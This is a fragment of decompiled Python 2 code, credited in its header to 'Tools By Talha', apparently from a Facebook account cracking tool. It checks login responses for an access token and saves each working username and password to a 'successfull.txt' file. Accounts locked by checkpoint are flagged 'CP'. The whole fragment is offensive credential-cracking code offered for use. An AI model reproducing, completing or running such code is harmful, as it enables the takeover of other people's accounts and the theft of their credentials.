# Decompile by Mardis (Tools By Talha)
# Time Succes decompile : 2022-06-25 10:32:19.377054
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m [Login After 07 Days]\x1b[0m \n'
